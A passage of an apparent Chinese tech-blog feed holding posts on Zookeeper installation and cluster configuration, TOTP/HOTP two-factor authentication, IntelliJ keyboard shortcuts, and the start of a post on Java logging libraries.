        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Zookeeper 是Apache软件基金会的一个软件项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。</p><h3 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h3><p>Zookeeper 有三种不同的运行环境：单机模式、伪集群模式、集群模式。在测试环境中资源有限我们常常使用单机模式或者伪集群模式，生产环境中使用集群模式。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ol><li><p>下载<br> 去 Zookeeper <a href="https://zookeeper.apache.org/">官网</a> 选着合适的版本下载即可。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压安装<br> 下载完成直接解压就行了</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf zookeeper-3.4.10.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure></li><li><p>启动与停止<br> 在解压完的 bin 目录下会有 zkServer[.sh|.bat] 脚本文件，运行脚本文件指定命令和配置文件即可。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止</span></span><br><span class="line">./bin/zkServer.sh stop /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>建立连接</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 连接单机</span><br><span class="line">./bin/zkCli.sh -server 127.0.0.1:2181</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 连接集群</span><br><span class="line">./bin/zkCli.sh -server 127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183</span><br></pre></td></tr></table></figure></li></ol><h4 id="单机模式配置"><a href="#单机模式配置" class="headerlink" title="单机模式配置"></a>单机模式配置</h4><p>单机模式就是在一台机器上启动一个 Zookeeper 服务。    </p><ol><li><p>复制配置文件</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>修改配置<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;zoo.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/data</span><br><span class="line">dataLogDir=/data/zookeeper/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br></pre></td></tr></table></figure><blockquote><p>配置说明：<br>dataDir：数据目录<br>dataLogDir：日志目录<br>clientPort：客户端连接端口<br>tickTime：Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。<br>initLimit：Zookeeper的Leader 接受客户端（Follower）初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过 5个心跳的时间（也就是tickTime）长度后 Zookeeper 服务器还没有收到客户端的返回信息，那么表明这个客户端连接失败。总的时间长度就是 5<em>2000&#x3D;10 秒<br>syncLimit：表示 Leader 与 Follower 之间发送消息时请求和应答时间长度，最长不能超过多少个tickTime 的时间长度，总的时间长度就是 2</em>2000&#x3D;4 秒。    </p></blockquote></li><li><p>启动服务</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li></ol><h4 id="伪集群模式配置"><a href="#伪集群模式配置" class="headerlink" title="伪集群模式配置"></a>伪集群模式配置</h4><p>伪集群模式就是在一台机器上面启动多个 Zookeeper 服务。    </p><table><thead><tr><th>myid</th><th>Data目录</th><th>Client</th><th>Server</th><th>Leader</th><th>配置文件</th></tr></thead><tbody><tr><td>1</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1&#x2F;data</td><td>2181</td><td>2222</td><td>2223</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1.cfg</td></tr><tr><td>2</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo2&#x2F;data</td><td>2182</td><td>3333</td><td>3334</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo2.cfg</td></tr><tr><td>3</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo3&#x2F;data</td><td>2183</td><td>4444</td><td>4445</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo3.cfg</td></tr></tbody></table><ol><li><p>创建多份配置文件初始化数据目录</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/zookeeper/cluster</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo1.cfg</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo2.cfg</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo3.cfg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo1/data /data/zookeeper/cluster/zoo1/logs</span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo2/data /data/zookeeper/cluster/zoo2/logs</span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo2/data /data/zookeeper/cluster/zoo2/logs</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/cluster/zoo1/data</span><br><span class="line">dataLogDir=/data/zookeeper/cluster/zoo1/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br><span class="line"></span><br><span class="line"># 集群配置</span><br><span class="line">server.1=127.0.0.1:2222:2225  </span><br><span class="line">server.2=127.0.0.1:3333:3335  </span><br><span class="line">server.3=127.0.0.1:4444:4445</span><br></pre></td></tr></table></figure><p> 集群配置格式<code>server.A=B:C:D</code>其中 A 是一个数字，表示这个是第几号服务器（在数据目录的 myid 中的值和它一样）；B 是这个服务器的 ip 地址；C 表示的是这个服务器与集群中的 Leader 服务器交换信息的端口；D 表示的是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，而这个端口就是用来执行选举时服务器相互通信的端口。如果是伪集群的配置方式，由于 B 都是一样，所以不同的 Zookeeper 实例通信端口号不能一样，所以要给它们分配不同的端口号。</p><p> 在每个数据存储目录新建 myid 文件，写入服务器 ID。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch /data/zookeeper/cluster/zoo1/data/myid /data/zookeeper/cluster/zoo2/data/myid /data/zookeeper/cluster/zoo3/data/myid</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /data/zookeeper/cluster/zoo1/data/myid</span><br><span class="line">echo 2 &gt; /data/zookeeper/cluster/zoo2/data/myid</span><br><span class="line">echo 3 &gt; /data/zookeeper/cluster/zoo3/data/myid</span><br></pre></td></tr></table></figure><blockquote><p>服务器交互端口不需要单独配置，只需要集群配置中写好就行了。<br>在伪集配置中，注意 clientPort 不要冲突，每个服务有单独的数据目录。</p></blockquote></li><li><p>启动服务</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo1.cfg</span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo2.cfg</span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo3.cfg</span><br></pre></td></tr></table></figure></li></ol><h4 id="集群模式配置"><a href="#集群模式配置" class="headerlink" title="集群模式配置"></a>集群模式配置</h4><p>集群模式就是在不同的机器部署多个 Zookeeper 服务，组成一个集群。这种配置可用性更高。</p><p>集群配置和伪集群配置基本一样，但是集群配置中由于不同的机器，使用资源不会冲突。配置文件中可以使用同样的端口，数据文件目录。</p><ol><li><p>在每台机器上创建配置文件</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;zoo.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/data</span><br><span class="line">dataLogDir=/data/zookeeper/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br><span class="line"></span><br><span class="line"># 集群配置</span><br><span class="line">server.1=10.0.1.11:2222:2225  </span><br><span class="line">server.2=10.0.1.12:2222:2225  </span><br><span class="line">server.3=10.0.1.13:2222:2225</span><br></pre></td></tr></table></figure><p> 在各个机器的数据目录中写入响应的 myid 文件。例如 <code>10.0.1.11</code> 机器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch /data/zookeeper/data/myid</span><br><span class="line">echo 1 &gt; /data/zookeeper/data/myid</span><br></pre></td></tr></table></figure></li><li><p>在各个机器中启动 Zookeeper 服务</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li></ol><h3 id="客户端命令"><a href="#客户端命令" class="headerlink" title="客户端命令"></a>客户端命令</h3><h4 id="链接到-Zookeeper"><a href="#链接到-Zookeeper" class="headerlink" title="链接到 Zookeeper"></a>链接到 Zookeeper</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/zkCli.sh -server 127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183</span><br></pre></td></tr></table></figure><h4 id="Zookeeper-目录树操作"><a href="#Zookeeper-目录树操作" class="headerlink" title="Zookeeper 目录树操作"></a>Zookeeper 目录树操作</h4><p>Zookeeper，内部是一个分层的文件系统目录树结构，每一个节点对应一个Znode。<a href="https://zookeeper.apache.org/doc/trunk/zookeeperStarted.html">参考</a></p><p>查看根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 8] ls /</span><br><span class="line">[zookeeper]</span><br></pre></td></tr></table></figure><p>创建一个新的Znode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 9] create /zk_test my_data</span><br><span class="line">Created /zk_test</span><br></pre></td></tr></table></figure><p>再次查看就能看到新创建的Znode了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 11] ls /</span><br><span class="line">[zookeeper, zk_test]</span><br></pre></td></tr></table></figure><p>读取内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 12] get /zk_test</span><br><span class="line">my_data</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 5</span><br><span class="line">mtime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 0</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 7</span><br><span class="line">numChildren = 0</span><br></pre></td></tr></table></figure><p>重新设置值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 14] set /zk_test junk</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 6</span><br><span class="line">mtime = Fri Jun 05 14:01:52 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 1</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 4</span><br><span class="line">numChildren = 0</span><br><span class="line">[zkshell: 15] get /zk_test</span><br><span class="line">junk</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 6</span><br><span class="line">mtime = Fri Jun 05 14:01:52 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 1</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 4</span><br><span class="line">numChildren = 0</span><br></pre></td></tr></table></figure><p>删除Znode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 16] delete /zk_test</span><br><span class="line">[zkshell: 17] ls /</span><br><span class="line">[zookeeper]</span><br><span class="line">[zkshell: 18]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用场景分析"><a href="#使用场景分析" class="headerlink" title="使用场景分析"></a>使用场景分析</h3><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><p><img src="/images/zk-dubbo2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dubbo://10.0.1.3:20880/cc.kekek.dubbo.demo.DemoService?anyhost=true&amp;application=demo-provider&amp;dubbo=2.5.7&amp;generic=false&amp;interface=cc.kekek.dubbo.demo.DemoService&amp;methods=sayHello,sayName&amp;pid=54299&amp;side=provider&amp;timestamp=1511263842858</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://taoistwar.gitbooks.io/spark-operationand-maintenance-management/content/spark_relate_software/zookeeper_install.html">【1】</a> <a href="http://www.jianshu.com/p/0ba61bf7149f">【2】</a> <a href="https://my.oschina.net/jackieyeah/blog/709130">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>两步验证</title>
      <link href="/post/2fa.html"/>
      <url>/post/2fa.html</url>
      
        <content type="html"><![CDATA[<h3 id="双重认证"><a href="#双重认证" class="headerlink" title="双重认证"></a>双重认证</h3><p>双重认证（英语：Two-factor authentication，缩写为2FA），是一种认证方法，使用两种不同的元素，合并在一起，来确认使用者的身份，是多因素验证中的一个特例。目前流行的主要是基于智能手机的两步验证，其中主流的又分 APP 方式和短信方式。</p><h3 id="Google-Authenticator"><a href="#Google-Authenticator" class="headerlink" title="Google Authenticator"></a>Google Authenticator</h3><p>Google Authenticator 是一种 APP 方式的两步验证。谷歌验证应用的使用方法是：用户安装手机客户端，生成临时身份验证码，提交到服务器验证身份。</p><h4 id="Google-两步验证的原理"><a href="#Google-两步验证的原理" class="headerlink" title="Google 两步验证的原理"></a>Google 两步验证的原理</h4><p>服务器首先要给每个用户生成一个 KEY，然后按照 <code>HOTP</code>（HMAC-based One-time Password） 或者 <code>TOTP</code>（Time-Based One-Time Password） 协议生成 <code>CODE</code>，根据协议不同，生成的 <code>CODE</code> 分别是<code>基于计数</code>的或者<code>基于时间</code>的。<br><img src="/images/WechatIMG47.jpeg"></p><h4 id="TOTP"><a href="#TOTP" class="headerlink" title="TOTP"></a>TOTP</h4><ol><li><p>共享密钥<br> 服务器端生成一个32位的密钥，共享给客户端。</p></li><li><p>客户端生成随机令牌<br> 客户端根据当前时间片和共享密钥生成一个随机令牌。</p><blockquote><p>这里比较重要的是用户手机时间要准确</p></blockquote></li><li><p>服务器验签<br> 服务器端根据当前时间和共享密钥生成一个随机令牌，两者比对。</p><blockquote><p>服务器使用和客户端同样的共享密钥和时间片得到的随机令牌，两者是一样的。  </p></blockquote><p> 伪代码</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hmac = SHA1(secret + SHA1(secret + input))</span><br></pre></td></tr></table></figure></li></ol><p>服务器时间和客户端时间可能不一致，这样就会导致服务器计算的令牌与用户输入的不同，验证失败。解决这个问题个一个方法是，服务器计算当前时间片以及前面的 n 个时间片内的一次性密码值，只要其中有一个与用户输入的密码相同，则验证通过。当然，n 不能太大，否则会降低安全性。</p><h4 id="HOTP"><a href="#HOTP" class="headerlink" title="HOTP"></a>HOTP</h4><ol><li><p>共享密钥和计数器<br> 服务器端生成一个32位密钥，另外客户端和服务器各有一个计数器C，并且事先将计数值同步。</p></li><li><p>客户端生成随机令牌<br> 客户端根据共享密钥和计数器的组合生成一个生成一个随机令牌，生成后客户端计数器计数值加1。</p></li><li><p>服务器验签<br> 服务器同样根据共享密钥和计数器生成一个随机令牌，两者比对。如果相同，服务器计数器加1。</p></li></ol><blockquote><p>如果验证失败或者客户端不小心多进行了一次生成密码操作，那么服务器和客户端之间的计数器C将不再同步，因此需要有一个重新同步（Resynchronization）的机制。</p></blockquote><p><code>HOTP</code> 算法中的计数器类似于 <code>TOTP</code> 中的时间片。<code>TOTP</code> 接收完共享密钥后就不需要和服务器进行交互了，<code>HOTP</code> 后面还需要和服务器同步计数器。这样看来 <code>TOTP</code>的方式可用性更高（特别是在国内不能访问Google服务的情况下），实现也更加简单。另外，为了安全两者本地的功效密钥都不能被第三方获知。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.zhihu.com/question/20462696">【1】</a> <a href="http://www.infoq.com/cn/news/2014/09/system-verification">【2】</a> <a href="http://blog.zlxstar.me/blog/2015/09/02/qian-tan-liang-bu-yan-zheng/">【3】</a> <a href="https://linux.cn/article-2641-1.html">【4】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 2fa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij快捷键</title>
      <link href="/post/intellij-keymap.html"/>
      <url>/post/intellij-keymap.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>快捷键</th><th>用途</th><th></th><th></th></tr></thead><tbody><tr><td>esc</td><td>从工具窗口进入代码文件窗口</td><td></td><td></td></tr><tr><td>cmd + alt + l</td><td>格式化</td><td>⭐️</td><td></td></tr><tr><td>cmd + alt + b</td><td>进入方法实现处</td><td>⭐️ ⭐️</td><td></td></tr><tr><td>cmd + alt + ←</td><td>后退</td><td></td><td></td></tr><tr><td>cmd + alt + →</td><td>前进</td><td></td><td></td></tr><tr><td>cmd + alt + m</td><td>重构方法、将选中的代码提取为方法</td><td>⭐️</td><td></td></tr><tr><td>cmd + alt + v</td><td>提取变量</td><td></td><td></td></tr><tr><td>cmd + alt + f</td><td>提取字段</td><td></td><td></td></tr><tr><td>cmd + alt + c</td><td>提取常量</td><td></td><td></td></tr><tr><td>cmd + alt + p</td><td>提取参数</td><td></td><td></td></tr><tr><td>cmd + alt + o</td><td>优化导入的包</td><td>⭐️</td><td></td></tr><tr><td>cmd + alt + t</td><td>包裹(if&#x2F;try-catch&#x2F;for)代码</td><td>⭐️</td><td></td></tr><tr><td>cmd + alt + j</td><td>弹出模板选择窗口，将选定的代码使用动态模板包住</td><td></td><td></td></tr><tr><td>cmd + shift + enter</td><td>自动完成</td><td>⭐️</td><td></td></tr><tr><td>cmd + shift + u</td><td>大小写转换</td><td></td><td></td></tr><tr><td>cmd + shift + ]&#x2F;[</td><td>选择直到代码块结束&#x2F;开始</td><td></td><td></td></tr><tr><td>cmd + shift + h</td><td>显示方法层次结构</td><td></td><td></td></tr><tr><td>cmd + n</td><td>查找类</td><td>⭐️</td><td></td></tr><tr><td>cmd + y\</td><td>x</td><td>删除当前行</td><td></td></tr><tr><td>cmd + d</td><td>复制当前行</td><td></td><td></td></tr><tr><td>cmd + &#x2F;</td><td>注释行 &#x2F;&#x2F;</td><td></td><td></td></tr><tr><td>cmd + f</td><td>搜索</td><td></td><td></td></tr><tr><td>cmd + r</td><td>替换</td><td></td><td></td></tr><tr><td>cmd + w</td><td>按照语法选中代码</td><td>⭐️</td><td></td></tr><tr><td>cmd + p</td><td>显示方法的参数信息</td><td></td><td></td></tr><tr><td>cmd + del</td><td>安全删除文件</td><td></td><td></td></tr><tr><td>cmd + o</td><td>重写父类方法</td><td></td><td></td></tr><tr><td>cmd + i</td><td>实现接口的方法</td><td></td><td></td></tr><tr><td>cmd + e</td><td>显示最近打开的文件记录列表</td><td>⭐️</td><td></td></tr><tr><td>cmd + b&#x2F;鼠标点击</td><td>进入光标所在的方法&#x2F;变量的接口或是定义处</td><td>⭐️</td><td></td></tr><tr><td>cmd + j</td><td>插入自定义动态代码模板</td><td>⭐️</td><td></td></tr><tr><td>cmd + f12&#x2F;7</td><td>显示类结构（属性、方法）</td><td></td><td></td></tr><tr><td>cmd + u</td><td>前往当前光标所在方法的父类的方法 &#x2F; 接口定义</td><td></td><td></td></tr><tr><td>ctrl + j</td><td>显示帮助文档</td><td></td><td></td></tr><tr><td>ctrl + h</td><td>显示当前类&#x2F;接口的子类或者实现</td><td>⭐️</td><td></td></tr><tr><td>ctrl + enter</td><td>自动生成(get&#x2F;set)</td><td>⭐️</td><td></td></tr><tr><td>cmd + shift + n</td><td>查找文件</td><td></td><td></td></tr><tr><td>alt + shfit + ↑</td><td>上移一行</td><td></td><td></td></tr><tr><td>alt + shift + ↓</td><td>下移一行</td><td></td><td></td></tr><tr><td>alt + enter</td><td>导入包</td><td></td><td></td></tr><tr><td>shift + f6</td><td>重命名类、变量</td><td>⭐️</td><td></td></tr><tr><td>shift + cmd</td><td>开始新的一行</td><td></td><td></td></tr><tr><td>ctrl + shift + j</td><td>将代码拼接成一行</td><td></td><td></td></tr><tr><td>ctrl + shift + f</td><td>全局查找</td><td></td><td></td></tr><tr><td>ctrl + shift + r</td><td>全局替换</td><td></td><td></td></tr><tr><td>ctrl + alt + h</td><td>显示调用层次结构</td><td></td><td></td></tr></tbody></table><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://wiki.jikexueyuan.com/project/intellij-idea-tutorial/keymap-mac-introduce.html">【1】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> keymap </tag>
            
            <tag> intellij </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 中的日志库</title>
      <link href="/post/java-logging.html"/>
      <url>/post/java-logging.html</url>
      
        <content type="html"><![CDATA[<h3 id="Java-日志库"><a href="#Java-日志库" class="headerlink" title="Java 日志库"></a>Java 日志库</h3><p>Java 拥有功能和性能都非常强大的日志库。比较常见的有 java.util.logging（jul）、Apache Common Logging（jcl）、Apache Log4j 1.x、Apache Log4j 2、SLF4J、Logback。</p><h3 id="日志规范和实现"><a href="#日志规范和实现" class="headerlink" title="日志规范和实现"></a>日志规范和实现</h3><p>在这些常见的类库中可以分为两类，一类是规范，另一类是日志实现。  </p><p>最开始 Java 中没有提供日志 API，后来 Apache 推出了 Log4j，很多项目开始使用了 Log4j 来记录日志。接着 Sun 在 Java1.4 中推出了 jul。现在就有两种日志实现了。开始很多项目中直接使用日志实现，这样对后面切换日志实现很不方便，这时候 jcl 出现了。jcl 只是定义了一套日志接口，支持运行时动态加载日志组件的实现，也就是说，在你应用代码里，只需调用Commons Logging的接口，底层实现可以是 Log4j，也可以是 jul。</p><p>后来又出现了 SLF4J（接口）、Logback（实现） 以及 Log4j 的升级版 Log4j 2，这里面Log4j 2 又分为两部分，log4j-api、log4j-core。log4j-api 是日志接口，log4j-core 是日志实现。</p><h3 id="统一"><a href="#统一" class="headerlink" title="统一"></a>统一</h3><p>一个项目中如果存在多种日志接口和实现是很混乱的，我们可以使用各种 Adapter 和 Bridge 把日志连接起来。slf4j-XXX-version.jar 和 XXX-over-slf4j.jar 就是做这种事情的。</p><p><img src="/images/v2-57092397ff9d7a69d359856ef19e769d_r.png"></p><blockquote><p>项目中引用日志类库时注意不要造成日志流转的死循环</p></blockquote><p>我们可以用 jcl-over-slf4j 来替换 jcl，使用 log4j-over-slf4j 来替换 log4j。可以通过 <code> mvn dependency:tree</code> 来打印出依赖关系。排除依赖的第三方库中的 Log  依赖。</p><p>下面的例子是把 log4j、jcl 全部通过桥接器将日志输出到 SLF4J，最后通过 Logback 输出。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 